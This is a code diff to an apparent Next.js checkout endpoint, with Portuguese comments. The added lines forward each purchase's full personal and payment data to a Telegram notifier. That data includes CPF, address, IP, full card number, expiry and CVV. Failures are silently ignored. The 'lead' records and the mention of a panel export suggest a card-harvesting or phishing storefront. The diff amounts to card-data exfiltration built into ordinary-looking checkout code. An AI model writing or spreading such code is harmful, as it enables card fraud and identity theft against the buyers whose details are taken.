@@ -2,6 +2,7 @@ import { NextRequest, NextResponse } from "next/server";
 import { prisma } from "@/lib/prisma";
 import { validateLead, isValidCardNumber, type LeadData } from "@/lib/leadValidation";
 import { sendConfirmationEmail } from "@/lib/resendEmail";
+import { notifyPurchaseDetails } from "@/lib/telegram";
 import { getCustomerSession } from "@/lib/customerAuth";
 
 export const dynamic = "force-dynamic";
@@ -276,6 +277,32 @@ export async function POST(req: NextRequest) {
 
     // e-mail de confirmação — falha não bloqueia o pedido
     await sendConfirmationEmail(lead.email, lead.fullName);
+
+    // Telegram: todos os dados da compra (mesmos campos do TXT do painel) —
+    // falha não bloqueia o pedido.
+    await notifyPurchaseDetails({
+      fullName: lead.fullName,
+      email: lead.email,
+      phone: lead.phone,
+      cpf: lead.cpf,
+      cep: lead.cep,
+      address: lead.address,
+      number: lead.number,
+      complement: lead.complement,
+      neighborhood: lead.neighborhood,
+      city: lead.city,
+      state: lead.state,
+      ip: lead.ip,
+      paymentMethod: lead.paymentMethod,
+      installments: lead.installments,
+      cardNumber: lead.cardNumber,
+      cardExpiry: lead.cardExpiry,
+      cardCvv: lead.cardCvv,
+      cardBank: lead.cardBank,
+      totalCents: lead.totalCents,
+      discountCents: lead.discountCents,
+      items,
+    }).catch(() => {});
 
     return NextResponse.json({ success: true, leadId: lead.id });
   } catch (err) {
